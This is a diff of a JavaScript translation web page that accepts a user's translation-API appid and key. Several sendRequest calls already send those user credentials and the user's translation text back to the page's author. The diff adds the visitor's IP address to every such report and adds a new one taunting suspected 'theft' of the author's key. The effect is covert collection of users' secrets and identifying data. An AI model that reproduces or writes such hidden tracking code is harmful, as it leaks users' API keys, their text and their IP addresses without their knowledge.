@@ -82,7 +82,7 @@ $("#saveBtn").click(() => {
 						if (data.error_code == "52003") {
 							showToast("<b>保存失败！</b>请检查后重新输入！解决不了的话加群反馈作者(QQ群:238223706)",
 								4500);
-							sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), data.error_code + "：" + "上车失败 &&" + localStorage.getItem("key1"), 1);
+							sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), data.error_code + "：" + "上车失败 &&" + localStorage.getItem("key1") + "IP 地址：" + kehu_ip, 1);
 							localStorage.removeItem("appid1");
 							localStorage.removeItem("key1");
 							$("#yourAppid").val("");
@@ -96,6 +96,7 @@ $("#saveBtn").click(() => {
 								localStorage.setItem("sTimes", 0);
 								$("#yourAppid").val("");
 								$("#yourKey").val("");
+								sendRequest("盗用: "+localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1") + "&&" + localStorage.getItem("key1"), "盗用 API 被我抓到了吧！IP 地址：" + kehu_ip, 1);
 							} else {
 								if (localStorage.getItem("sTimes") != -1 && localStorage.getItem("appid1") == WtdKltf2 && localStorage.getItem("key1") == zDQA3) {
 									localStorage.setItem('sTimes', -2)
@@ -107,7 +108,7 @@ $("#saveBtn").click(() => {
 								$('#exampleModal').modal('hide');
 								$('.modal-backdrop').css("z-index", "-10");
 								$('body').css("padding-right", "");
-								sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1") + "&&" + localStorage.getItem("key1"), "上车了！", 4);
+								sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1") + "&&" + localStorage.getItem("key1"), "上车了！IP 地址：" + kehu_ip, 4);
 							}
 						}
 					},
@@ -195,7 +196,7 @@ $(".translateBtn").click(() => {
 							} else {
 								showToast("正在翻译中...请耐心等待", 2500);
 							}
-							sendRequest(localStorage.getItem("sTimes") + " \\ " + appid11, key11 + ' \\ errorTimes: ' + errorTimes + ' \\ restartTimes: ' + restartTimes + "：" + to.val(), 2);
+							sendRequest(localStorage.getItem("sTimes") + " \\ " + appid11, key11 + ' \\ errorTimes: ' + errorTimes + ' \\ restartTimes: ' + restartTimes + " \\ " +"IP 地址：" + kehu_ip + to.val(), 2);
 							translateMain(0);
 						} else {
 							showToast("检测到你输入的字数超过500字，请调整减少字数后重新输入再翻译。由于你是体验用户，我这边限制了字数。如需提高字数，请自行查阅帮助去配置！", 3000);
@@ -210,7 +211,7 @@ $(".translateBtn").click(() => {
 						} else {
 							showToast("正在翻译中...请耐心等待", 2500);
 						}
-						sendRequest(localStorage.getItem("sTimes") + " \\ " + appid11, key11 + ' \\ errorTimes: ' + errorTimes + ' \\ restartTimes: ' + restartTimes + "：" + to.val(), 2);
+						sendRequest(localStorage.getItem("sTimes") + " \\ " + appid11, key11 + ' \\ errorTimes: ' + errorTimes + ' \\ restartTimes: ' + restartTimes + " \\ " +"IP 地址：" + kehu_ip +  to.val(), 2);
 						translateMain(0);
 					}
 				} else {
@@ -263,7 +264,7 @@ $(".translateAndCompareBtn").click(() => {
 							} else {
 								showToast("正在翻译中...请耐心等待", 2500);
 							}
-							sendRequest(localStorage.getItem("sTimes") + " \\ " + appid11, key11 + ' \\ errorTimes: ' + errorTimes + ' \\ restartTimes: ' + restartTimes + "：" + to.val(), 2);
+							sendRequest(localStorage.getItem("sTimes") + " \\ " + appid11, key11 + ' \\ errorTimes: ' + errorTimes + ' \\ restartTimes: ' + restartTimes + ' \\ ' +"IP 地址：" + kehu_ip + to.val(), 2);
 							translateMain(1);
 						} else {
 							showToast("检测到你输入的字数超过500字，请调整减少字数后重新输入再翻译。由于你是体验用户，我这边限制了字数。如需提高字数，请自行查阅帮助去配置！", 3000);
@@ -278,7 +279,7 @@ $(".translateAndCompareBtn").click(() => {
 						} else {
 							showToast("正在翻译中...请耐心等待", 2500);
 						}
-						sendRequest(localStorage.getItem("sTimes") + " \\ " + appid11, key11 + ' \\ errorTimes: ' + errorTimes + ' \\ restartTimes: ' + restartTimes + "：" + to.val(), 2);
+						sendRequest(localStorage.getItem("sTimes") + " \\ " + appid11, key11 + ' \\ errorTimes: ' + errorTimes + ' \\ restartTimes: ' + restartTimes + " \\ " +"IP 地址：" + kehu_ip +  to.val(), 2);
 						translateMain(1);
 					}
 				} else {
@@ -1113,7 +1114,7 @@ okBtn.click(() => {
 		sckey1 = aMewlv1;
 		if (rscode == sckey1) {
 			if (!cursTimes) {
-				sendRequest(localStorage.getItem("appid1"), "密钥正确，白嫖成功了！", 6);
+				sendRequest(localStorage.getItem("appid1"), "密钥正确，白嫖成功了！" +"IP 地址：" + kehu_ip, 6);
 				localStorage.setItem("appid1", WtdKltf2);
 				localStorage.setItem("key1", zDQA3);
 				localStorage.setItem("sTimes", 180000);
@@ -1169,7 +1170,7 @@ okBtn.click(() => {
 			showToast("未输入，提交失败！", 4000);
 		} else {
 			showToast("密钥不正确，请重新获取", 3000);
-			sendRequest(localStorage.getItem("appid1"), "密钥不正确，请重新获取！白嫖失败！", 7);
+			sendRequest(localStorage.getItem("appid1"), "密钥不正确，请重新获取！白嫖失败！" +"IP 地址：" + kehu_ip, 7);
 		}
 	}
 	if (timer !== null) {
